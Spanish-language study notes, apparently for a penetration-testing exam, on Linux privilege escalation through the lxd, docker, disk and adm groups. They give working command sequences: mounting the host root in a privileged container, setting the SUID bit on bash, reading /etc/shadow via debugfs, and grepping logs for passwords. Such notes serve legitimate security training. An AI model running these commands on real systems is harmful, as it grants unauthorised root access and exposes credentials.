
## 1. Enumeración inicial

Comprueba los grupos a los que pertenece el usuario:

```
id
groups
```

Busca pertenencias a grupos que puedan permitir acceder a archivos sensibles, dispositivos o contenedores con privilegios.

---

## 2. Grupo `lxd` — Escalada mediante contenedores

Los usuarios del grupo `lxd` pueden gestionar contenedores LXD. Si la configuración lo permite, pueden crear un contenedor privilegiado y montar el sistema de archivos del host para acceder a él como root.

**Comprobar pertenencia:**

```
id
```

Si aparece `lxd` entre los grupos, comprueba si puedes utilizar `lxc`.

**Ejemplo de explotación en el laboratorio:**

```bash
# Descomprimir la imagen de Alpine
unzip alpine.zip
cd "64-bit Alpine"

# Inicializar LXD (puede fallar la configuración del bridge)
lxd init

# Importar la imagen
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

# Crear un contenedor privilegiado
lxc init alpine r00t -c security.privileged=true

# Montar la raíz del host dentro del contenedor
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

# Iniciar el contenedor y abrir una shell
lxc start r00t
lxc exec r00t /bin/sh
```

Dentro del contenedor:

```
id
cd /mnt/root/root
ls -la
```

**Idea clave:** un contenedor privilegiado con acceso al sistema de archivos del host puede permitir acceder a archivos protegidos, como claves SSH o `/etc/shadow`.

> La explotación depende de que el usuario pueda administrar LXD y de que la configuración permita este montaje.

## 3. Grupo `docker` — Acceso al sistema de archivos del host

Los usuarios del grupo `docker` pueden tener capacidad para ejecutar contenedores y montar directorios del host. Si el daemon Docker permite estas operaciones, esto puede equivaler a privilegios de root.

**Comprobar pertenencia:**

```
id
```

**Ejemplo: montar** `**/root**` **dentro de un contenedor:**

```
docker run --rm -it -v /root:/mnt ubuntu bash
```

Dentro del contenedor:

```
ls -la /mnt
```

Si el montaje funciona con permisos suficientes, podrás acceder al contenido de `/root` desde `/mnt`.

También puedes comprobar si puedes montar otros directorios sensibles, como `/etc`.

**Idea clave:** tener acceso al daemon Docker con permisos para crear contenedores privilegiados puede permitir acceder al sistema de archivos del host como root.

```bash
docker pull ubuntu:latest
docker images
docker run --rm --dit -v /:/mnt/root --name NOMBRE ubuntu
docker ps
docker exec -it NOMBRE bash

cd mnt/root/bin
chmod u+s bash
exit

bash -p
```

## 4. Grupo `disk` — Acceso directo a dispositivos

Los miembros del grupo `disk` pueden tener acceso de lectura o escritura a dispositivos de almacenamiento, lo que puede permitir acceder a datos protegidos del sistema de archivos.

**Comprobar pertenencia:**

```
id
```

**Identificar los dispositivos:**

```
ls -l /dev/sd*
lsblk
```

**Ejemplo con** `**debugfs**`**:**

```
debugfs /dev/sda1
```

Una vez dentro de `debugfs`, puedes explorar el sistema de archivos:

```
ls
cd /root
ls
```

Para leer un archivo, por ejemplo:

```
cat /etc/shadow
```

La disponibilidad de estas operaciones depende del dispositivo, del sistema de archivos y de los permisos efectivos.

**Idea clave:** el acceso directo a un dispositivo que contiene el sistema operativo puede permitir leer datos que normalmente están protegidos por los permisos de Linux.

---

## 5. Grupo `adm` — Lectura de registros

Los miembros del grupo `adm` pueden leer registros almacenados en `/var/log`. Esto **no proporciona root directamente**, pero puede revelar credenciales, rutas, tareas programadas o información útil para continuar la escalada.

**Comprobar pertenencia:**

```
id
```

**Enumerar registros:**

```
ls -lah /var/log
```

Buscar información interesante:

```
grep -RiE 'password|passwd|token|secret|credential' /var/log 2>/dev/null
```

Revisar registros habituales:

```
less /var/log/auth.log
less /var/log/syslog
```

En algunas distribuciones los nombres o las ubicaciones pueden ser diferentes.

**Idea clave:** utiliza los registros para descubrir credenciales, comandos ejecutados, inicios de sesión y posibles pistas sobre tareas privilegiadas.

## 6. Tabla rápida para el examen

|Grupo|Riesgo principal|Qué comprobar|
|---|---|---|
|`lxd`|Crear contenedores privilegiados y acceder al host|`id`, `lxc`, imágenes disponibles|
|`docker`|Crear contenedores y montar directorios del host|`id`, `docker ps`, `docker images`|
|`disk`|Acceder directamente a dispositivos de almacenamiento|`id`, `lsblk`, `ls -l /dev/sd*`|
|`adm`|Leer registros con información sensible|`id`, `ls -lah /var/log`, buscar credenciales|

## 7. Checklist de enumeración

Al conseguir una shell en Linux:

```
id
groups
```

Después, busca estos grupos:

- `**lxd**`**:** ¿puedes crear un contenedor privilegiado y montar el host?
    
- `**docker**`**:** ¿puedes ejecutar contenedores y montar directorios del host?
    
- `**disk**`**:** ¿tienes acceso a dispositivos que contienen datos protegidos?
    
- `**adm**`**:** ¿hay registros con credenciales o información útil?
    

**Importante:** pertenecer a un grupo no garantiza automáticamente una escalada. Comprueba los permisos efectivos y las condiciones del sistema.
